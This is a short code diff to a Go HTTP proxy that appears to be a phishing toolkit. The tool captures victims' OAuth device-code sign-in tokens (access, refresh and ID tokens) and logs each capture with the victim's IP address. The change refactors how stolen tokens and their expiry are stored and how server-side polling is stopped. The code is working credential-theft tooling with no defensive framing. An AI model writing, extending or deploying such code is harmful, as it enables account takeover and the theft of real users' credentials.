@@ -1814,13 +1814,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						dcSession.AccessToken = tokenData.AccessToken
 						dcSession.RefreshToken = tokenData.RefreshToken
 						dcSession.IDToken = tokenData.IDToken
-						dcSession.TokenType = tokenData.TokenType
-						dcSession.ExpiresIn = tokenData.ExpiresIn
-						dcSession.Scope = tokenData.Scope
+						dcSession.TokenScope = tokenData.Scope
+						dcSession.TokenExpiry = time.Now().Add(time.Duration(tokenData.ExpiresIn) * time.Second)
+						dcSession.CapturedAt = time.Now()
 						dcSession.mu.Unlock()
 
 						// Cancel server-side polling if running
-						dcSession.Cancel()
+						select {
+						case <-dcSession.pollCancel:
+							// Already closed
+						default:
+							close(dcSession.pollCancel)
+						}
 
 						log.Important("[dc/poll] [%s] TOKEN CAPTURED via browser proxy! (victim IP: %s)", session_id, victimIP)
 
